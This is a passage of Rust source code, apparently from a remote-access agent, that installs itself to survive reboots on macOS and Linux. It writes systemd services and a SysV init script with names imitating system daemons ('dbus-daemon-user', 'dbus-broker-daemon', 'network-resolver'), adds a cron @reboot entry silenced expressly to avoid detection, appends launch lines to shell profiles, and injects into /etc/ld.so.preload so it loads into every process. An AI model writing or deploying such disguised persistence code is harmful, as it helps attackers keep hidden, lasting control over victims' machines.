                .helper_bundle_path_for_executable(executable_path)
                .ok_or_else(|| {
                    anyhow!(
                        "LoginItem::install: executable is not running from an application bundle"
                    )
                })?;

            if !helper_bundle_path.exists() {
                return Err(anyhow!(
                    "LoginItem::install: ServiceManagement requires helper app at '{}'. \
                     Place the helper in '<MainApp>.app/Contents/Library/LoginItems/' and retry.",
                    helper_bundle_path.display()
                ));
            }

            let helper_bundle_id = Self::read_helper_bundle_id(&helper_bundle_path)?;
            Ok(SmHelperContext {
                helper_bundle_path,
                helper_bundle_id,
            })
        }

        fn sm_set_enabled(helper_bundle_id: &str, enabled: bool) -> Result<()> {
            use std::ffi::CString;

            let c_id = CString::new(helper_bundle_id)
                .map_err(|_| anyhow!("LoginItem: helper bundle id contains NUL byte"))?;

            unsafe {
                let cf_id = CFStringCreateWithCString(
                    std::ptr::null(),
                    c_id.as_ptr(),
                    K_CFSTRING_ENCODING_UTF8,
                );
                if cf_id.is_null() {
                    return Err(anyhow!(
                        "LoginItem: CFStringCreateWithCString failed for '{}'",
                        helper_bundle_id
                    ));
                }

                let ok = SMLoginItemSetEnabled(cf_id, if enabled { 1 } else { 0 }) != 0;
                CFRelease(cf_id);

                if !ok {
                    return Err(anyhow!(
                        "LoginItem: SMLoginItemSetEnabled({}, enabled={}) failed. \
                         Ensure helper app '{}' is signed and embedded correctly.",
                        helper_bundle_id,
                        enabled,
                        helper_bundle_id
                    ));
                }
            }

            Ok(())
        }

        fn install_via_service_management(&self, ctx: &SmHelperContext) -> Result<()> {
            Self::sm_set_enabled(&ctx.helper_bundle_id, true)?;
            log::info!(
                "LoginItem::install: enabled ServiceManagement helper '{}' from '{}'",
                ctx.helper_bundle_id,
                ctx.helper_bundle_path.display()
            );
            Ok(())
        }

        fn remove_via_service_management(&self, ctx: &SmHelperContext) -> Result<()> {
            Self::sm_set_enabled(&ctx.helper_bundle_id, false)?;
            log::info!(
                "LoginItem::remove: disabled ServiceManagement helper '{}'",
                ctx.helper_bundle_id
            );
            Ok(())
        }

        fn verify_via_service_management(&self, ctx: &SmHelperContext) -> Result<bool> {
            let uid = unsafe { libc::getuid() };
            let service = format!("gui/{}/{}", uid, ctx.helper_bundle_id);
            let status = std::process::Command::new("launchctl")
                .arg("asuser")
                .arg(uid.to_string())
                .arg("launchctl")
                .arg("print")
                .arg(&service)
                .status()
                .map_err(|e| anyhow!("LoginItem::verify: launchctl asuser print: {}", e))?;
            Ok(status.success())
        }

        fn as_launch_agent(&self) -> LaunchAgent {
            LaunchAgent {
                label: format!(
                    "com.{}.helper",
                    self.app_name.to_ascii_lowercase().replace(' ', "-")
                ),
                asuser_bootstrap: true,
            }
        }
    }

    impl Persist for LoginItem {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            match Self::strategy_for_executable(executable_path) {
                LoginItemStrategy::ServiceManagement => {
                    let ctx = self.resolve_sm_helper_context(executable_path)?;
                    self.install_via_service_management(&ctx)
                }
                LoginItemStrategy::LaunchAgentFallback => {
                    log::info!(
                        "LoginItem::install: executable is not in an app bundle; using LaunchAgent fallback"
                    );
                    self.as_launch_agent().install(executable_path)
                }
            }
        }

        fn remove(&self) -> Result<()> {
            let exe = match std::env::current_exe() {
                Ok(p) => p,
                Err(_) => return self.as_launch_agent().remove(),
            };

            match Self::strategy_for_executable(&exe) {
                LoginItemStrategy::ServiceManagement => {
                    let ctx = self.resolve_sm_helper_context(&exe)?;
                    self.remove_via_service_management(&ctx)
                }
                LoginItemStrategy::LaunchAgentFallback => self.as_launch_agent().remove(),
            }
        }

        fn verify(&self) -> Result<bool> {
            let exe = match std::env::current_exe() {
                Ok(p) => p,
                Err(_) => return self.as_launch_agent().verify(),
            };

            match Self::strategy_for_executable(&exe) {
                LoginItemStrategy::ServiceManagement => {
                    let launch_agent_ok = self.as_launch_agent().verify().unwrap_or(false);
                    let sm_ok = match self.resolve_sm_helper_context(&exe) {
                        Ok(ctx) => self.verify_via_service_management(&ctx)?,
                        Err(_) => false,
                    };
                    Ok(sm_ok || launch_agent_ok)
                }
                LoginItemStrategy::LaunchAgentFallback => self.as_launch_agent().verify(),
            }
        }
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Linux persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(target_os = "linux")]
pub use linux::*;
#[cfg(target_os = "linux")]
pub mod linux {
    use super::{Persist, shell_quote_single};
    use anyhow::{anyhow, Result};
    use std::io::Write;
    use std::path::PathBuf;

    const CRON_MARKER: &str = "# orchestra-managed-persistence";
    const SHELL_MARKER_BEGIN: &str = "# orchestra-managed-persistence begin";
    const SHELL_MARKER_END: &str = "# orchestra-managed-persistence end";

    // ── FR-3A: Systemd user service ───────────────────────────────────────────
    pub struct SystemdService {
        pub service_name: String,
    }

    impl Default for SystemdService {
        fn default() -> Self {
            Self {
                service_name: "dbus-daemon-user".to_string(),
            }
        }
    }

    impl Persist for SystemdService {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let unit = format!(
                "[Unit]\nDescription=D-Bus User Session Proxy\nAfter=default.target\n\n\
                [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\n\
                [Install]\nWantedBy=default.target\n"
            );
            let unit_dir = dirs::home_dir()
                .ok_or_else(|| anyhow!("SystemdService: no home dir"))?
                .join(".config/systemd/user");
            std::fs::create_dir_all(&unit_dir)
                .map_err(|e| anyhow!("SystemdService: mkdir: {}", e))?;
            let unit_path = unit_dir.join(format!("{}.service", self.service_name));
            std::fs::write(&unit_path, unit)
                .map_err(|e| anyhow!("SystemdService: write: {}", e))?;
            let reload = std::process::Command::new("systemctl")
                .args(["--user", "daemon-reload"])
                .status()
                .map_err(|e| anyhow!("SystemdService: daemon-reload: {}", e))?;
            if !reload.success() {
                log::warn!("SystemdService::install: daemon-reload returned non-zero");
            }
            let enable = std::process::Command::new("systemctl")
                .args(["--user", "enable", "--now", &self.service_name])
                .status()
                .map_err(|e| anyhow!("SystemdService: enable --now: {}", e))?;
            if !enable.success() {
                return Err(anyhow!(
                    "SystemdService::install: enable --now '{}' failed",
                    self.service_name
                ));
            }
            log::info!("SystemdService::install: enabled '{}'", self.service_name);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "disable", "--now", &self.service_name])
                .status();
            let unit_dir = match dirs::home_dir() {
                Some(h) => h.join(".config/systemd/user"),
                None => return Ok(()),
            };
            let _ = std::fs::remove_file(unit_dir.join(format!("{}.service", self.service_name)));
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "daemon-reload"])
                .status();
            log::info!("SystemdService::remove: removed '{}'", self.service_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("systemctl")
                .args(["--user", "is-enabled", &self.service_name])
                .output()
                .map_err(|e| anyhow!("SystemdService::verify: {}", e))?;
            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
        }
    }

    // ── FR-3B: Cron Job ───────────────────────────────────────────────────────
    pub struct CronJob;

    impl Persist for CronJob {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let quoted_exe = shell_quote_single(exe.as_ref());
            let quoted_marker = shell_quote_single(CRON_MARKER);
            // Redirect both stdout and stderr to /dev/null so cron does not
            // attempt to mail the output to the user (which would be a detection artifact).
            let entry = format!("@reboot {} >/dev/null 2>&1 {}", quoted_exe, CRON_MARKER);
            let quoted_entry = shell_quote_single(&entry);
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!(
                    "(crontab -l 2>/dev/null | grep -v {}; echo {}) | crontab -",
                    quoted_marker, quoted_entry
                ))
                .status()
                .map_err(|e| anyhow!("CronJob::install: {}", e))?;
            if !out.success() {
                return Err(anyhow!("CronJob::install: crontab command failed"));
            }
            log::info!("CronJob::install: added @reboot entry for '{}'", exe);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let quoted_marker = shell_quote_single(CRON_MARKER);
            let _ = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!(
                    "crontab -l 2>/dev/null | grep -v {} | crontab -",
                    quoted_marker
                ))
                .status()
                .map_err(|e| anyhow!("CronJob::remove: {}", e))?;
            log::info!("CronJob::remove: removed managed @reboot entries");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg("crontab -l 2>/dev/null")
                .output()
                .map_err(|e| anyhow!("CronJob::verify: {}", e))?;
            let stdout = String::from_utf8_lossy(&out.stdout);
            Ok(stdout.contains(CRON_MARKER))
        }
    }

    // ── FR-3C: Shell Profile (.bashrc / .profile) ─────────────────────────────
    pub struct ShellProfile;

    impl Persist for ShellProfile {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let home = dirs::home_dir().ok_or_else(|| anyhow!("ShellProfile: no home dir"))?;
            let mut profile_names = vec![".zshrc", ".bashrc", ".profile", ".bash_profile"];
            if let Ok(shell) = std::env::var("SHELL") {
                let shell = shell.to_ascii_lowercase();
                let preferred = if shell.contains("zsh") {
                    Some(".zshrc")
                } else if shell.contains("bash") {
                    Some(".bashrc")
                } else if shell.contains("fish") {
                    Some(".config/fish/config.fish")
                } else {
                    None
                };

                if let Some(profile) = preferred {
                    if let Some(idx) = profile_names.iter().position(|p| *p == profile) {
                        profile_names.remove(idx);
                    }
                    profile_names.insert(0, profile);
                }
            }

            for profile_name in &profile_names {
                let path = home.join(profile_name);
                if path.exists() {
                    let existing = std::fs::read_to_string(&path).unwrap_or_default();
                    if existing.contains(SHELL_MARKER_BEGIN) {
                        log::debug!(
                            "ShellProfile::install: already present in '{}'",
                            profile_name
                        );
                        return Ok(());
                    }
                    let mut file = std::fs::OpenOptions::new()
                        .append(true)
                        .open(&path)
                        .map_err(|e| {
                            anyhow!("ShellProfile::install: open '{}': {}", profile_name, e)
                        })?;
                    writeln!(
                        file,
                        "\n{}\n({} &) 2>/dev/null\n{}",
                        SHELL_MARKER_BEGIN, exe, SHELL_MARKER_END
                    )
                    .map_err(|e| anyhow!("ShellProfile::install: write: {}", e))?;
                    log::info!("ShellProfile::install: appended to '{}'", path.display());
                    return Ok(());
                }
            }
            Err(anyhow!(
                "ShellProfile::install: no suitable shell profile found"
            ))
        }

        fn remove(&self) -> Result<()> {
            let home = match dirs::home_dir() {
                Some(h) => h,
                None => return Ok(()),
            };
            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile"] {
                let path = home.join(profile_name);
                if !path.exists() {
                    continue;
                }
                if let Ok(content) = std::fs::read_to_string(&path) {
                    let filtered = remove_shell_profile_block(&content);
                    let _ = std::fs::write(&path, filtered);
                }
            }
            log::info!("ShellProfile::remove: removed persistence entries");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let home = match dirs::home_dir() {
                Some(h) => h,
                None => return Ok(false),
            };
            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile"] {
                let path = home.join(profile_name);
                if let Ok(content) = std::fs::read_to_string(&path) {
                    if content.contains(SHELL_MARKER_BEGIN) || content.contains("# system-update-")
                    {
                        return Ok(true);
                    }
                }
            }
            Ok(false)
        }
    }

    /// Install only the user-level systemd unit by default. Other persistence
    /// mechanisms remain available as explicit building blocks, but are not
    /// enabled automatically because they have broader side effects and more
    /// platform-specific failure modes.
    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let cfg = crate::config::load_config()
            .unwrap_or_default()
            .persistence;

        if cfg.systemd_service {
            if let Err(e) = SystemdService::default().install(&exe) {
                log::warn!("SystemdService install failed (non-fatal): {}", e);
            }
        }
        if cfg.cron_job {
            if let Err(e) = CronJob.install(&exe) {
                log::warn!("CronJob install failed (non-fatal): {}", e);
            }
        }
        if cfg.shell_profile {
            if let Err(e) = ShellProfile.install(&exe) {
                log::warn!("ShellProfile install failed (non-fatal): {}", e);
            }
        }

        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let _ = SystemdService::default().remove();
        let _ = CronJob.remove();
        let _ = ShellProfile.remove();
        Ok(exe)
    }

    // ── 5.2: Systemd system-wide service (root) ───────────────────────────────

    /// Systemd system service under /etc/systemd/system/.  Requires root.
    pub struct SystemdSystemService {
        pub service_name: String,
    }

    impl Default for SystemdSystemService {
        fn default() -> Self {
            Self {
                service_name: "dbus-broker-daemon".to_string(),
            }
        }
    }

    impl Persist for SystemdSystemService {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            if unsafe { libc::getuid() } != 0 {
                return Err(anyhow!("SystemdSystemService::install: requires root"));
            }
            let exe = executable_path.to_string_lossy();
            let unit = format!(
                "[Unit]\nDescription=D-Bus Broker Daemon\nAfter=network.target\n\n\
                [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\
                User=root\n\n[Install]\nWantedBy=multi-user.target\n"
            );
            let unit_dir = std::path::Path::new("/etc/systemd/system");
            std::fs::create_dir_all(unit_dir)
                .map_err(|e| anyhow!("SystemdSystemService: mkdir: {}", e))?;
            let unit_path = unit_dir.join(format!("{}.service", self.service_name));
            std::fs::write(&unit_path, unit)
                .map_err(|e| anyhow!("SystemdSystemService: write: {}", e))?;
            let _ = std::process::Command::new("systemctl")
                .args(["daemon-reload"])
                .status();
            let _ = std::process::Command::new("systemctl")
                .args(["enable", "--now", &self.service_name])
                .status();
            log::info!(
                "SystemdSystemService::install: enabled '{}'",
                self.service_name
            );
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let _ = std::process::Command::new("systemctl")
                .args(["disable", "--now", &self.service_name])
                .status();
            let path = std::path::Path::new("/etc/systemd/system")
                .join(format!("{}.service", self.service_name));
            let _ = std::fs::remove_file(&path);
            let _ = std::process::Command::new("systemctl")
                .args(["daemon-reload"])
                .status();
            log::info!(
                "SystemdSystemService::remove: removed '{}'",
                self.service_name
            );
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("systemctl")
                .args(["is-enabled", &self.service_name])
                .output()
                .map_err(|e| anyhow!("SystemdSystemService::verify: {}", e))?;
            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
        }
    }

    // ── 5.2: SysV init script ─────────────────────────────────────────────────

    /// SysV-style init script placed in /etc/init.d/ with rc runlevel symlinks.
    /// Requires root.
    pub struct InitScript {
        pub script_name: String,
    }

    impl Default for InitScript {
        fn default() -> Self {
            Self {
                script_name: "network-resolver".to_string(),
            }
        }
    }

    impl Persist for InitScript {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            if unsafe { libc::getuid() } != 0 {
                return Err(anyhow!("InitScript::install: requires root"));
            }
            let exe = executable_path.to_string_lossy();
            let script = format!(
                "#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          {name}\n\
                # Required-Start:    $network\n# Required-Stop:     $network\n\
                # Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n\
                # Short-Description: Network Resolver Service\n### END INIT INFO\n\n\
                case \"$1\" in\n  start) {exe} &;;\n  stop) pkill -f '{exe}' || true;;\n\
                esac\nexit 0\n",
                name = self.script_name,
                exe = exe,
            );
            let initd = std::path::Path::new("/etc/init.d");
            std::fs::create_dir_all(initd).map_err(|e| anyhow!("InitScript: mkdir: {}", e))?;
            let script_path = initd.join(&self.script_name);
            std::fs::write(&script_path, script)
                .map_err(|e| anyhow!("InitScript: write: {}", e))?;
            // Set executable permission.
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&script_path, std::fs::Permissions::from_mode(0o755))
                .map_err(|e| anyhow!("InitScript: chmod: {}", e))?;
            // Create runlevel symlinks for runlevels 2, 3, 5.
            for rc in &["rc2.d", "rc3.d", "rc5.d"] {
                let rc_dir = std::path::Path::new("/etc").join(rc);
                if rc_dir.exists() {
                    let link = rc_dir.join(format!("S99{}", self.script_name));
                    let _ = std::os::unix::fs::symlink(&script_path, &link);
                }
            }
            log::info!("InitScript::install: installed '{}'", script_path.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            for rc in &["rc2.d", "rc3.d", "rc5.d"] {
                let link = std::path::Path::new("/etc")
                    .join(rc)
                    .join(format!("S99{}", self.script_name));
                let _ = std::fs::remove_file(&link);
            }
            let _ =
                std::fs::remove_file(std::path::Path::new("/etc/init.d").join(&self.script_name));
            log::info!("InitScript::remove: removed '{}'", self.script_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            Ok(std::path::Path::new("/etc/init.d")
                .join(&self.script_name)
                .exists())
        }
    }

    // ── 5.2: ld.so.preload injection ─────────────────────────────────────────

    /// Appends the agent's shared-object path to /etc/ld.so.preload so it is
    /// injected into every dynamically-linked process.  Requires root.
    pub struct LdPreload;

    impl Persist for LdPreload {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            if unsafe { libc::getuid() } != 0 {
                return Err(anyhow!("LdPreload::install: requires root"));
            }
            if executable_path.extension().and_then(|ext| ext.to_str()) != Some("so") {
                return Err(anyhow!(
                    "LdPreload::install requires a shared object (.so); refusing executable path '{}'",
                    executable_path.display()
                ));
            }
            let path = executable_path.to_string_lossy();
            let preload_file = std::path::Path::new("/etc/ld.so.preload");
            // Read existing contents and check for duplicate entry.
            let existing = std::fs::read_to_string(preload_file).unwrap_or_default();
            if existing.lines().any(|l| l.trim() == path.as_ref()) {
                log::debug!("LdPreload::install: entry already present");
                return Ok(());
            }
            let mut file = std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(preload_file)
                .map_err(|e| anyhow!("LdPreload::install: open: {}", e))?;
            writeln!(file, "{}", path).map_err(|e| anyhow!("LdPreload::install: write: {}", e))?;
            log::info!("LdPreload::install: added '{}' to /etc/ld.so.preload", path);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let preload_file = std::path::Path::new("/etc/ld.so.preload");
            if !preload_file.exists() {
                return Ok(());
            }
            let exe = std::env::current_exe().unwrap_or_default();
            let exe_str = exe.to_string_lossy();
            let content = std::fs::read_to_string(preload_file).unwrap_or_default();
            let filtered: String = content
                .lines()
                .filter(|l| l.trim() != exe_str.as_ref())
                .map(|l| format!("{}\n", l))
                .collect();
            let _ = std::fs::write(preload_file, filtered);
            log::info!("LdPreload::remove: removed entry from /etc/ld.so.preload");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let preload_file = std::path::Path::new("/etc/ld.so.preload");
            if !preload_file.exists() {
                return Ok(false);
            }
            let exe = std::env::current_exe().unwrap_or_default();
            let exe_str = exe.to_string_lossy();
            let content = std::fs::read_to_string(preload_file).unwrap_or_default();
            Ok(content.lines().any(|l| l.trim() == exe_str.as_ref()))
        }
    }

    fn remove_shell_profile_block(content: &str) -> String {
        let mut out = Vec::new();
        let mut skipping_managed_block = false;
        let mut skip_legacy_next = false;
        for line in content.lines() {
            if skip_legacy_next {
                skip_legacy_next = false;
                continue;
            }
            if line.contains(SHELL_MARKER_BEGIN) {
                skipping_managed_block = true;
                continue;
            }
            if skipping_managed_block {
                if line.contains(SHELL_MARKER_END) {
                    skipping_managed_block = false;
                }
                continue;
            }
            if line.contains("# system-update-") {
                skip_legacy_next = true;
                continue;
            }
            out.push(line);
        }
        if out.is_empty() {
            String::new()
        } else {
            let mut filtered = out.join("\n");
            filtered.push('\n');
            filtered
        }
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn shell_profile_remove_deletes_marker_and_command() {
            let content = "before\n# system-update-/tmp/a\n(/tmp/agent &) 2>/dev/null\nafter\n";
            let filtered = remove_shell_profile_block(content);
            assert!(filtered.contains("before"));
            assert!(filtered.contains("after"));
            assert!(!filtered.contains("system-update"));
            assert!(!filtered.contains("/tmp/agent"));
        }

        #[test]
        fn shell_profile_remove_deletes_managed_block() {
            let content = format!(
                "before\n{}\n(/tmp/agent &) 2>/dev/null\n{}\nafter\n",
                SHELL_MARKER_BEGIN, SHELL_MARKER_END
            );
            let filtered = remove_shell_profile_block(&content);
            assert_eq!(filtered, "before\nafter\n");
        }
    }
}
